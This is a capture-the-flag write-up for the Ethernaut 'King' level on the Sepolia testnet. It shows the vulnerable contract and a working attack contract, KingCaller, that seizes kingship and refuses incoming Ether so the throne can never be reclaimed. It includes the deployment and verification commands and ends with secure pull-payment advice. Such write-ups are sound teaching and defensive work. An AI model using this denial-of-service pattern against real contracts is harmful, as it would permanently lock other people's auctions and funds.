# 09 - King

## Overview

- **Difficulty:** 6/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x3595bb7e136B61aD00B2aB92CA75bE23D1b41B6f`](https://sepolia.etherscan.io/address/0x3595bb7e136B61aD00B2aB92CA75bE23D1b41B6f)
- **Attack Contract (`KingCaller`):** [`0x27676761e6384662D9E0F8dE63E93b02B56Ad969`](https://sepolia.etherscan.io/address/0x27676761e6384662D9E0F8dE63E93b02B56Ad969)
- **Transactions:**
  - **1. Deploy & Seize Kingship (`KingCaller` with 0.001 ETH):** [`0x5d1e271c656b80cf419846557555eedb6351ce3e15195e04724c38ecf7e86aae`](https://sepolia.etherscan.io/tx/0x5d1e271c656b80cf419846557555eedb6351ce3e15195e04724c38ecf7e86aae)
  - **2. Level Submission:** [`0xf8a68b9dc481619e2a59e1be05f0686d44431b62ed6845668e177a21215d8347`](https://sepolia.etherscan.io/tx/0xf8a68b9dc481619e2a59e1be05f0686d44431b62ed6845668e177a21215d8347)

---

## Objective

Become the king and prevent the Ethernaut level instance from reclaiming kingship upon submission.

---

## Contract Analysis

The target contract is [`src/09-king/King.sol`](./King.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

### Game Mechanics

1. When a user sends Ether to `King`, the `receive()` function requires `msg.value >= prize` (or caller is `owner`).
2. If satisfied, the contract attempts to forward the new `msg.value` to the previous king:
   ```solidity
   payable(king).transfer(msg.value);
   ```
3. Then it updates `king = msg.sender` and `prize = msg.value`.

---

### Vulnerability Breakdown: Denial of Service (DoS) via Unexpected Revert

The vulnerability lies in the coupled transfer inside `receive()`:

```solidity
payable(king).transfer(msg.value);
king = msg.sender;
prize = msg.value;
```

1. **`transfer()` Reverts on Failure:**
   Solidity's `.transfer()` opcode sends 2300 gas to the recipient and **automatically reverts** the whole transaction if the call fails.
2. **Untrusted External Call:**
   The `king` variable holds an untrusted address. If `king` points to a smart contract that **does not implement `receive()` or payable `fallback()`** (or deliberately calls `revert()`), any attempt to transfer Ether to it will fail.
3. **Permanent DoS (King Forever):**
   When our exploit contract becomes king:
   - Any future caller (including the Ethernaut level factory during submission) sending ETH to dethrone us will trigger `payable(king).transfer(msg.value)`.
   - Because our exploit contract refuses incoming Ether, `.transfer()` reverts.
   - The entire transaction reverts, preventing anyone from ever updating `king` or `prize`!

```text
[ Ethernaut Factory / Attacker ]
               │
               │ 1. Sends ETH >= prize to become King
               ▼
       [ King.sol receive() ]
               │
               │ 2. payable(king).transfer(msg.value)
               ▼
     [ KingCaller Contract ] (No receive / fallback!)
               │
               └───▶ REVERTS! 💥
               │
       [ King.sol Transaction Reverts! ]
       (Kingship cannot be reclaimed!)
```

---

## Attack Contract

The exploit is implemented in [`src/09-king/KingCaller.sol`](./KingCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract KingCaller {
    constructor(address payable _king) payable {
        uint256 prize = King(_king).prize();
        (bool success, ) = _king.call{value: prize}("");
        require(success, "Transfer failed");
    }
}
```

### Exploit Architecture

1. **1-Tx Kingship Takeover:**
   When `KingCaller` is deployed, its `payable` constructor reads `King.prize()` and forwards that exact amount via `.call{value: prize}("")`, instantly seizing kingship in the deployment transaction.
2. **No Payable Fallback:**
   `KingCaller` contains **no `receive()` and no `fallback()`** functions. Any plain Ether transfer sent to `KingCaller` in the future will automatically revert with `0x` bytes.
3. **Eternal Kingship:**
   No one can ever dethrone `KingCaller`.

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy `KingCaller` and Claim the Throne

Deploy `KingCaller` supplying `1000000000000000 wei` (`0.001 ETH`) matching the current prize:

```bash
forge create src/09-king/KingCaller.sol:KingCaller \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME> \
  --value 1000000000000000wei \
  --broadcast \
  --constructor-args 0x3595bb7e136B61aD00B2aB92CA75bE23D1b41B6f
```

- **Deploy & Exploit Tx:** [`0x5d1e271c656b80cf419846557555eedb6351ce3e15195e04724c38ecf7e86aae`](https://sepolia.etherscan.io/tx/0x5d1e271c656b80cf419846557555eedb6351ce3e15195e04724c38ecf7e86aae)
- **Deployed Contract Address:** [`0x27676761e6384662D9E0F8dE63E93b02B56Ad969`](https://sepolia.etherscan.io/address/0x27676761e6384662D9E0F8dE63E93b02B56Ad969)

### 2. Verify Kingship

Check the current king via `_king()`:

```bash
cast call 0x3595bb7e136B61aD00B2aB92CA75bE23D1b41B6f "_king()(address)" --rpc-url sepolia
# Output: 0x27676761e6384662D9E0F8dE63E93b02B56Ad969 (KingCaller)
```

### 3. Submit Level

Submit the instance on Ethernaut:

- When submitting, the level contract attempts to reclaim kingship by sending ETH.
- The transfer to `KingCaller` fails, causing the submission check to confirm the contract is broken.
- **Submission Tx:** [`0xf8a68b9dc481619e2a59e1be05f0686d44431b62ed6845668e177a21215d8347`](https://sepolia.etherscan.io/tx/0xf8a68b9dc481619e2a59e1be05f0686d44431b62ed6845668e177a21215d8347)

---

## Key Security Takeaways

1. **Favor Pull over Push Payments:**
   Never automatically "push" funds to untrusted addresses as a prerequisite for state updates. If an external call fails, the entire transaction reverts, opening the door to Denial of Service (DoS) attacks.
2. **Implement Withdrawal Pattern:**
   Instead of pushing payments directly:
   ```solidity
   // Secure Pattern: Pull over Push
   mapping(address => uint256) public pendingReturns;

   function withdraw() external {
       uint256 amount = pendingReturns[msg.sender];
       require(amount > 0, "No funds");
       pendingReturns[msg.sender] = 0;
       (bool success, ) = msg.sender.call{value: amount}("");
       require(success, "Transfer failed");
   }
   ```
3. **Avoid Hardcoded Gas Limits (`.transfer()` / `.send()`):**
   Although `.transfer()` was designed to prevent reentrancy, its fixed 2300 gas limit breaks compatibility with smart wallets (e.g. multisigs, account abstraction) and causes unrecoverable reverts when calling contracts. Use low-level `call{value: ...}("")` paired with the **Checks-Effects-Interactions (CEI)** pattern or OpenZeppelin's `ReentrancyGuard`.
